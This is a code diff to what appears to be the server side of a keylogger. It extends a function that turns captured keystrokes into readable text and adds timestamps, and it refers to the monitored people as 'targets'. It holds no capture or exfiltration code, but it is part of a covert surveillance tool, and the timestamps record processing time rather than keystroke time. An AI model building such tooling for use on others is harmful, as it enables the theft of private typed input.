@@ -19,10 +19,12 @@ class LogData(BaseModel):
     user_name: str  # User name (or target name)
 
 # Utility function to parse raw key logs
+from datetime import datetime
+
 def parse_logs(raw_logs: str) -> str:
     key_mapping = {
         "Key.space": " ",
-        "Key.enter": "[ENTER]",
+        "Key.enter": "\n",  # Newline on Enter
         "Key.tab": "[TAB]",
         "Key.backspace": "[BACKSPACE]",
         "Key.ctrl_l": "[CTRL]",
@@ -30,15 +32,46 @@ def parse_logs(raw_logs: str) -> str:
         "Key.alt_l": "[ALT]",
         "Key.right": "[RIGHT]",
         "Key.left": "[LEFT]",
+        "Key.caps_lock": "[CAPS LOCK]",
+        "Key.page_up": "[PAGE UP]",
+        "Key.page_down": "[PAGE DOWN]",
+        "Key.esc": "[ESC]",
+        "Key.up": "[UP ARROW]",
+        "Key.down": "[DOWN ARROW]",
+        "Key.left": "[LEFT ARROW]",
+        "Key.right": "[RIGHT ARROW]",
+        "Key.delete": "[DELETE]",
+        "Key.insert": "[INSERT]",
+        "Key.end": "[END]",
+        "Key.home": "[HOME]",
+        "Key.f1": "[F1]",
+        "Key.f2": "[F2]",
+        "Key.f3": "[F3]",
+        "Key.f4": "[F4]",
+        "Key.f5": "[F5]",
+        "Key.f6": "[F6]",
+        "Key.f7": "[F7]",
+        "Key.f8": "[F8]",
+        "Key.f9": "[F9]",
+        "Key.f10": "[F10]",
+        "Key.f11": "[F11]",
+        "Key.f12": "[F12]",
     }
 
     readable_logs = []
     for log in raw_logs.splitlines():
+        # Map the raw key press to a readable key
         if log in key_mapping:
             readable_logs.append(key_mapping[log])
         else:
-            readable_logs.append(log.strip("'"))  # Remove single quotes for characters
+            # For printable characters, just clean up the quotes
+            readable_logs.append(log.strip("'"))
+        
+        # Add timestamp and format
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        readable_logs.append(f" [{timestamp}]")  # Append timestamp
 
+    # Join the logs into a single string and return
     return "".join(readable_logs)
 
 @app.get("/targets")
